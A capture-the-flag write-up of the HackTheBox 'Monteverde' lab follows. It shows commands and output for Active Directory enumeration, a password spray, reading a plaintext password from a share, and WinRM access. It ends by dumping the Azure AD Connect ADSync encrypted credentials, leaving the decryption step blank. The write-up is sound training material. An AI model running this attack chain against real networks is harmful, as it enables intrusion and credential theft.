# Monteverde

# User Flag

## NMAP Enumeration

NMAP All Port Scan

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.10.172

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49736/tcp open  unknown          syn-ack ttl 127
49950/tcp open  unknown          syn-ack ttl 127
```

NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.10.172 -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49673,49674,49675,49736,49950

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-29 14:25:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
49950/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-06-29T14:26:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

## SMB Enumeration

Used `smbclient` which indicates anonymous logic is successful but no shares are returned.

```bash
smbclient -L //10.10.10.172 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
```

Used `crackmapexec` but can't enumerate any shares:

```bash
crackmapexec smb 10.10.10.172 --shares
crackmapexec smb 10.10.10.172 -u '' -p '' --shares
crackmapexec smb 10.10.10.172 -u 'guest' -p '' --shares
```

Used `enum4linux` to enumerate shares and was able to retrieve some users.

```bash
cat enum4linux.txt
```

Used `crackmapexec` to get a list of users:

```bash
crackmapexec smb 10.10.10.172 -u '' -p '' --users

SMB         10.10.10.172    445    MONTEVERDE       [+] Enumerated domain user(s)
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\Guest                          Built-in account for guest access to the computer/domain                                                                                                                                    
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\AAD_987d7f2f57d2               Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.                                           
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\mhope                          
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\SABatchJobs                    
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\svc-ata                        
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\svc-bexec                      
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\svc-netapp                     
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\dgalanos                       
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\roleary                        
SMB         10.10.10.172    445    MONTEVERDE       MEGABANK.LOCAL\smorgan
```



## Kerberos

Use kerbrute to validate user list:

```bash
sudo /opt/kerbrute_linux_amd64 userenum --dc 10.10.10.172 -d MEGABANK.LOCAL -o kerbrute-user-enum /home/kali/Downloads/HackTheBox/Monteverde/userslist

2024/06/29 15:44:26 >  [+] VALID USERNAME:       svc-ata@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       mhope@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       SABatchJobs@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       svc-bexec@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       AAD_987d7f2f57d2@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       svc-netapp@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       dgalanos@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       roleary@MEGABANK.LOCAL
2024/06/29 15:44:26 >  [+] VALID USERNAME:       smorgan@MEGABANK.LOCAL
```

ASREPRoasting with Impacket:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py MEGABANK.LOCAL/ -dc-ip 10.10.10.172 -usersfile userslist -no-pass -request -outputfile kerberos-users-found
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## LDAP Enumeration:

Extract base naming contexts:

```bash
ldapsearch -x -H ldap://10.10.10.172 -s base namingcontexts 
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=MEGABANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=MEGABANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Extracted users:

```bash
ldapsearch -x -H ldap://10.10.10.172 -D '' -w '' -b "DC=megabank,DC=local" '(objectClass=person)' > ldap-people.txt
```

Extracted Computers:

```bash
ldapsearch -x -H ldap://10.10.10.172 -D '' -w '' -b "DC=megabank,DC=local" '(objectClass=computer)' > ldap-computer.txt
```

## Password Bruteforce

Used `crackmapexec` to brute force smb login:

```bash
crackmapexec smb 10.10.10.172 -u userslist -p userslist

SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```

Found a set of Credentials: `SABatchJobs:SABatchJobs`

## SMB Enumeration (Pt. 2)

Enumerated SMB shares:

```bash
crackmapexec smb 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --shares

SMB         10.10.10.172    445    MONTEVERDE       Share           Permissions     Remark
SMB         10.10.10.172    445    MONTEVERDE       -----           -----------     ------
SMB         10.10.10.172    445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.10.10.172    445    MONTEVERDE       azure_uploads   READ            
SMB         10.10.10.172    445    MONTEVERDE       C$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       E$                              Default share
SMB         10.10.10.172    445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.10.10.172    445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.10.10.172    445    MONTEVERDE       users$          READ
```

Looked under `users$` and found a file titled `azure.xml` under the folder `mhope\`:

```bash
smbclient //10.10.10.172/users$ --user SABatchJobs --password SABatchJobs

smb: \mhope\> ls
  .                                   D        0  Fri Jan  3 13:41:18 2020
  ..                                  D        0  Fri Jan  3 13:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 13:40:23 2020
```

In the file `azure.xml`, found a password:

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

Checked if user `mhope` has WinRM permissions:

```bash
crackmapexec winrm 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'

WINRM       10.10.10.172    5985   MONTEVERDE       [+] MEGABANK.LOCAL\mhope:4n0therD4y@n0th3r$ (Pwn3d!)
```

Used `evil-winrm` and got the user flag:

```bash
evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$

*Evil-WinRM* PS C:\Users\mhope\Desktop> dir


    Directory: C:\Users\mhope\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/29/2024   6:57 AM             34 user.txt
```


# Root Flag

## User Enumeration

Checked user `mhope` privileges and what groups they are apart of: 

```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          Attributes
=========================================== ================ ============================================ ==================================================
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

I can see the user is a member of the `Azure Admins` group.

## Azure AD - Privilege Escalation

This [post](https://blog.xpnsec.com/azuread-connect-for-redteam/) covers exploiting Azure AD connect. The idea is that there is a user that is setup to handle replication of Active Directory to Azure. In the default case, that’s an account named like MSOL_[somehex]. I’ll see shortly that’s not the case here.

It turns out mhope is able to connect to the local database and pull the configuration. I can then decrypt it and get the username and password for the account that handles replication.

The exploit breaks down into three parts:

1. Get the information from the DB to retrieve the encryption keys from the KeyManager.
2. Get the config and encrypted password from the DB.
3. Fetch the keys and decrypt the password.

### 1. Get the information from the DB to retrieve the encryption keys from the KeyManager.

Use `sqlcmd` to get the information from the DB to retrieve the encryption keys from the KeyManager.

```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -d ADSync -Q 'SELECT keyset_id, instance_id, entropy FROM mms_server_configuration'

keyset_id   instance_id                          entropy
----------- ------------------------------------ ------------------------------------
          1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD
```

### 2. Get the config and encrypted password from the DB.

Use `sqlcmd` to get the config information:

```bash
*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -y0 -d ADSync -Q 'SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = "AD"'
<adma-configuration>
 <forest-name>MEGABANK.LOCAL</forest-name>
 <forest-port>0</forest-port>
 <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
 <forest-login-user>administrator</forest-login-user>
 <forest-login-domain>MEGABANK.LOCAL</forest-login-domain>
 <sign-and-seal>1</sign-and-seal>
 <ssl-bind crl-check="0">0</ssl-bind>
 <simple-bind>0</simple-bind>
 <default-ssl-strength>0</default-ssl-strength>
 <parameter-values>
  <parameter name="forest-login-domain" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="forest-login-user" type="string" use="connectivity" dataType="String">administrator</parameter>
  <parameter name="password" type="encrypted-string" use="connectivity" dataType="String" encrypted="1" />
  <parameter name="forest-name" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
  <parameter name="sign-and-seal" type="string" use="connectivity" dataType="String">1</parameter>
  <parameter name="crl-check" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="ssl-bind" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="simple-bind" type="string" use="connectivity" dataType="String">0</parameter>
  <parameter name="Connector.GroupFilteringGroupDn" type="string" use="global" dataType="String" />
  <parameter name="ADS_UF_ACCOUNTDISABLE" type="string" use="global" dataType="String" intrinsic="1">0x2</parameter>
  <parameter name="ADS_GROUP_TYPE_GLOBAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000002</parameter>
  <parameter name="ADS_GROUP_TYPE_DOMAIN_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
  <parameter name="ADS_GROUP_TYPE_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
  <parameter name="ADS_GROUP_TYPE_UNIVERSAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000008</parameter>
  <parameter name="ADS_GROUP_TYPE_SECURITY_ENABLED" type="string" use="global" dataType="String" intrinsic="1">0x80000000</parameter>
  <parameter name="Forest.FQDN" type="string" use="global" dataType="String" intrinsic="1">MEGABANK.LOCAL</parameter>
  <parameter name="Forest.LDAP" type="string" use="global" dataType="String" intrinsic="1">DC=MEGABANK,DC=LOCAL</parameter>
  <parameter name="Forest.Netbios" type="string" use="global" dataType="String" intrinsic="1">MEGABANK</parameter>
</parameter-values>
 <password-hash-sync-config>
            <enabled>1</enabled>
            <target>{B891884F-051E-4A83-95AF-2544101C9083}</target>
         </password-hash-sync-config>
</adma-configuration> 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ=
```

The encrypted password is there at the bottom.


### 3. Fetch the keys and decrypt the password.





## Bloodhound


```bash
bloodhound-python -ns 10.10.10.172 -d MEGABANK.LOCAL -dc MEGABANK.LOCAL -u mhope -p 4n0therD4y@n0th3r$ -c All
```



















